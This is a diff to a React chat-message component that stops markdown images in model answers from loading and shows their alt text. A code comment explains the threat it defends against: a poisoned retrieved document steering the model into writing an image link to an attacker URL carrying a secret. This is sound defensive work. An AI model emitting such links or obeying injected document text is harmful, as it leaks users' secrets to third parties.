@@ -1,5 +1,5 @@
 import { memo, useState } from 'react';
-import ReactMarkdown from 'react-markdown';
+import ReactMarkdown, { type Components } from 'react-markdown';
 import remarkGfm from 'remark-gfm';
 import type { CitationResponse, FeedbackRating, TimingsResponse } from '../api/types';
 import CitationCard from './CitationCard';
@@ -7,6 +7,12 @@ import StreamingSkeleton from './StreamingSkeleton';
 import './ChatMessage.css';
 
 const REMARK_PLUGINS = [remarkGfm];
+// Answers quote retrieved documents, and a poisoned document can steer the model into
+// writing `![](https://attacker/?q=<secret>)` — which the browser would fetch the moment
+// it rendered, no click needed. Show the alt text instead of loading anything.
+const MARKDOWN_COMPONENTS: Components = {
+  img: ({ alt }) => (alt ? <span className="chat-message__image-alt">[{alt}]</span> : null),
+};
 const TIME_FORMAT = new Intl.DateTimeFormat(undefined, { hour: '2-digit', minute: '2-digit' });
 
 export interface FeedbackPayload {
@@ -168,7 +174,9 @@ function ChatMessage({
               <StreamingSkeleton stage={streamStage} />
             ) : (
               <div className="chat-message__markdown">
-                <ReactMarkdown remarkPlugins={REMARK_PLUGINS}>{turn.content}</ReactMarkdown>
+                <ReactMarkdown remarkPlugins={REMARK_PLUGINS} components={MARKDOWN_COMPONENTS}>
+                  {turn.content}
+                </ReactMarkdown>
               </div>
             )}
             <div className="chat-message__meta-row">
